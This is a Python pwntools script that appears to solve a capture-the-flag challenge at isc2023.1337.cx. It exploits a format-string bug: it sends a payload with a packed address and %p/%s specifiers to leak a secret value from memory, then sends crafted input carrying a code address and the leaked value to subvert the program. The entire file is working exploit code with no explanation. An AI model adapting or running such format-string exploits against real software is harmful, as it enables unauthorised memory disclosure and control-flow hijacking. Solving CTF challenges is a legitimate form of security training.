from pwn import *

conn = remote('isc2023.1337.cx', 10091)
print(conn.recvline())
print(conn.recvline())
conn.send(b"AA" + b"\x70\xb0\x04\x08" + b"%p" * 3 + b"---%s---\n")
print(conn.recvregex(b"---"))
print("Here starts the memory leak: ")

lucky_number = conn.recvregex(b"---")
print(lucky_number)

lucky_number = lucky_number[:-3]
lucky_number = int.from_bytes(lucky_number, "little")
print("Managed to leak: ", lucky_number)

print(conn.recvline())
print(conn.recvline())
conn.send(b"1 " * 37 + b"134514406 " + b"1 " +
          bytes(str(lucky_number), 'ascii') + b" x\n")
print(conn.recvline())
print(conn.recvline())
print(conn.recvline())
print(conn.recvline())
print(conn.recvline())
conn.send(b"n\n")
print(conn.recvline())
print(conn.recvline())

conn.close()

